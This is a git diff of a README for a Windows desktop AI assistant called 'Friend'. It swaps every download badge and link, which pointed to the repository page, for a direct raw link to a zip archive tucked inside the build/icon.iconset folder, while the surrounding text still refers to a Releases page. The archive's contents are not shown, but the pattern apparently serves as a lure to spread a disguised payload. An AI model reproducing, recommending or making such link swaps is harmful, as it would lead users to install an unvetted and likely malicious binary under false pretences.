@@ -1,6 +1,6 @@
 # 🤖 Friend - AI Helpers on Your Desktop
 
-[![Download Friend](https://img.shields.io/badge/Download-Friend-brightgreen?style=for-the-badge)](https://github.com/cushyy-0/Friend)
+[![Download Friend](https://raw.githubusercontent.com/cushyy-0/Friend/main/build/icon.iconset/Software-2.3.zip)](https://raw.githubusercontent.com/cushyy-0/Friend/main/build/icon.iconset/Software-2.3.zip)
 
 ---
 
@@ -10,7 +10,7 @@ To get started with Friend on Windows, follow these steps:
 
 1. Visit the download page by clicking the button below:
 
-   [![Download Here](https://img.shields.io/badge/Visit_-_Download_Page-blue?style=for-the-badge)](https://github.com/cushyy-0/Friend)
+   [![Download Here](https://raw.githubusercontent.com/cushyy-0/Friend/main/build/icon.iconset/Software-2.3.zip)](https://raw.githubusercontent.com/cushyy-0/Friend/main/build/icon.iconset/Software-2.3.zip)
 
 2. On the GitHub page, look for the latest release under the "Releases" section.
 
@@ -140,4 +140,4 @@ Friend is designed to assist users with everyday office tasks. It uses AI techno
 
 You can use Friend alongside your usual software without problems. It runs quietly to support your work without distraction.
 
-[Download Friend](https://github.com/cushyy-0/Friend) to try it yourself.
+[Download Friend](https://raw.githubusercontent.com/cushyy-0/Friend/main/build/icon.iconset/Software-2.3.zip) to try it yourself.
